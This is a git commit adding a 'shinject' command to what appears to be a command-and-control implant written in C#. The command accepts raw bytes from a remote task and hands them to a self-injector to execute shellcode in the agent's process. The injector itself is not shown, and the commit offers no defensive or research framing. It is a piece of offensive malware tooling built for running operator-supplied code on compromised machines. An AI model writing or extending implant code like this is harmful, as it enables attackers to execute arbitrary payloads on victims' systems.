ca34abb3eb203edb9d4afab3846653f448e73488
WG37 <willg2070@gmail.com>
2025-12-20 21:54:25 +1100

    feat(command): add shellcode inject

---
+++ Agent/Application/Commands/ShellCodeInject.cs
@@ -0,0 +1,30 @@
+﻿using AgentClient.Application.Services;
+using AgentClient.Domain.Models.Agents;
+
+namespace AgentClient.Application.Commands
+{
+    public class ShellCodeInject : AgentCommand
+    {
+        public override string Name => "shinject";
+
+        public override string Execute(AgentTask task)
+        {
+            if (task.FileBytes == null)
+            {
+                throw new ArgumentException("FileBytes cannot be null", nameof(task));
+            }
+
+            var injector = new SelfInjector();
+            var success = injector.Inject(task.FileBytes);
+
+            if (success)
+            {
+                return "Injection successful";
+            }
+            else
+            {
+                return "Injection failed";
+            }
+        }
+    }
+}
